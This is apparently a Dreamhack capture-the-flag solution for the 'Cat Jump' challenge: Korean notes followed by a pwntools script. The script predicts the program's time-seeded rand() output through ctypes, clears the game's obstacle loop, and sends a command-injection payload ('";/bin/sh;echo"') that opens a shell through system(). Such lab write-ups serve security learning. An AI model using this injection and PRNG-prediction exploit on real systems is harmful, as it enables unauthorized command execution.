'''
[Dreamhack] Cat Jump
1. 취약점: 입력값을 검증 없이 system() 함수 인자로 사용하므로 Command Injection 발생
    # system() 함수는 내부적으로 /bin/sh을 열고 "sh -c 입력값" 명령을 검증 없이 실행함
2. 시나리오: do-while 루프를 통과한 뒤, 명령어 메타인자를 통해 /bin/sh 명령어 실행
3. 페이로드 구조: [ \";/bin/sh;echo\" ]
    # `;`: 두 개의 명령어를 분리하여 실행한다. (앞의 명령어가 실패해도 다음 명령어 실행)
'''

'''
[ 파이썬 ctypes 라이브러리 ]
# C 호환 데이터형을 제공하며, DLL 혹은 공유 라이브러리에 있는 함수를 파이썬에서 직접 호출할 수 있도록 해준다.
# 하지만, 원격에서 실행되는 파일의 경우 메모리에 로드되는 시간 등 외부 요인으로 인해 동기화가 안 맞을 수 있다.
'''

from pwn import *
from ctypes import CDLL

# context.log_level = 'debug'

reach_roof = False
for offset in range(-5, 6):
    try:
        # p = remote('IP', PORT)
        p = process('./cat_jump')

        libc = CDLL('/lib/x86_64-linux-gnu/libc.so.6')      # C library function

        libc.srand(libc.time(0x00) + offset)

        for i in range(37):
            obstacle = libc.rand() % 2

            p.recvuntil(b"jump='j': ")
            if obstacle == 0:
                p.sendline(b'l')
            elif obstacle == 1:
                p.sendline(b'h')

            print(offset, p.recvline())
            libc.rand() # for catnip

        p.sendlineafter(b': ', b"hello\";/bin/sh;echo\"")
        p.interactive()

    except EOFError:
        pass

    finally:
        p.close()